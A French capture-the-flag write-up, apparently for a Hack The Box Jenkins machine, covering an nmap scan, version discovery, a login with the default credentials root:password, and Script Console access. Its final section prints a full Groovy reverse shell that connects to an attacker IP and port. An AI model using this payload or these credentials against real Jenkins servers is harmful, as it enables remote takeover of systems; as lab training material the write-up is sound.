


## What does the acronym CVE stand for?

D'apres internet : 
	Common Vulnerabilities and Exposures


## What do the three letters in CIA, referring to the CIA triad in cybersecurity, stand for?
	confidentiality, integrity, availability


## What is the version of the service running on port 8080?

Apres un scan :

```bash
nmap -p- -A -T5 10.129.42.130
```

On trouve :
	8080/tcp open   http     Jetty 9.4.39.v20210325


## What version of Jenkins is running on the target?

On peut aller dans /error => http://10.129.42.142:8080/error

en bas à droite on voit la version de Jenkins : 
	2.289.1

## What type of script is accepted as input on the Jenkins Script Console?

On peut se connecter avec les identifiants : 
	root:password

D'apres la page d'acceuil c'est : 
	groovy


## What would the "String cmd" variable from the Groovy Script snippet be equal to if the Target VM was running Windows?

Pour avoir un shell il faut aller dans Manage Jenkins puis Scritp Console et utiliser un revershell en groovy : 
	String host="10.10.14.167";int port=12345;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

